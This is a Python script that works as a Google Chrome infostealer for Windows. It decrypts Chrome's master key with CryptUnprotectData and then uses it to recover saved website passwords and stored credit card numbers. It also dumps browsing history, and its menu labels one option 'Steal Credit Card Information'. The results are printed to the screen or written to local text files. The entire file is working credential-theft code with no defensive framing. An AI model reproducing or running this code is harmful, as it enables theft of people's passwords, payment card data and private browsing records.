import os
import sqlite3
import random
import shutil
import json
import base64
import win32crypt
from Crypto.Cipher import AES

def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = generate_cipher(master_key, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

def credit_cards():
    path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Web Data'
    shutil.copy2(path, "vault.db")  # making a temp copy since Login Data DB is locked while Chrome is running
    if not os.path.isfile(path):
        return
    conn = sqlite3.connect(path)
    cursor = conn.cursor()
    cc_file_path = os.path.join("cc's.txt")
    with open(cc_file_path, 'a', encoding="utf-8") as f:
        if os.path.getsize(cc_file_path) == 0:
            f.write(
                "Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number\n\n")
        for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
            name_on_card, expiration_month, expiration_year, card_number_encrypted = res
            card_number = decrypt_password(
                card_number_encrypted, get_master_key())
            f.write(
                f"{name_on_card}  |  {expiration_month}  |  {expiration_year}  |  {card_number}\n")
    cursor.close()
    conn.close()

def getpath():
    os_Platform = os.sys.platform
    if os_Platform == "win32" or os_Platform == "cygwin":
        PathName = os.getenv("localappdata") + '\\\Google\\Chrome\\User Data\\Default\\'
    else:
        if os_Platform == "linux" or os_Platform == "linux2":
            PathName = '/.config/google-chrome/Defaults '
        else:
            print("Currently Operating System Not Supported")
    return PathName

def extract_history():
    path = getpath()
    info_list = []
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\History'
    shutil.copy2(login_db, "Historyvault.db")  # making a temp copy since Login Data DB is locked while Chrome is running

    try:
        connection = sqlite3.connect('Historyvault.db')
        with connection:  # Context Manager
            cursor = connection.cursor()
            v = cursor.execute("""SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') 
                                    AS last_visit_time FROM urls ORDER BY last_visit_time DESC""")
            value = v.fetchall()

            for url, title, last_visit_time in value:
                info_list.append({
                    "Url": url,
                    "Title": title,
                    "Date&Time": last_visit_time
                })
        cursor.close()
        connection.close()
        os.remove("Historyvault.db")

    except sqlite3.OperationalError as e:
        print(e)
    return info_list

def output_text(info):
    with open('Chrome_history.txt', 'wb') as txt_file:
        for data in info:
            txt_file.write(
                f"{data['Url']} \t\t {data['Title']} \t\t{data['Date&Time']} \n".encode('utf-8'))  # bytes to string
    print("Data written in Chrome_history.txt")

def main():
    print("Choose an option:")
    print("1. Retrieve Chrome Passwords")
    print("2. Extract Chrome History")
    print("3. Steal Credit Card Information")

    choice = input("Enter your choice (1/2/3): ")

    if choice == '1':
        master_key = get_master_key()
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
        shutil.copy2(login_db, "Loginvault.db")  # making a temp copy since Login Data DB is locked while Chrome is running
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                if len(username) > 0:
                    print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
        except Exception as e:
            pass
        cursor.close()
        conn.close()
        os.remove("Loginvault.db")

    elif choice == '2':
        output_text(extract_history())

    elif choice == '3':
        credit_cards()

    else:
        print("Invalid choice. Please enter 1, 2, or 3.")

if __name__ == "__main__":
    main()
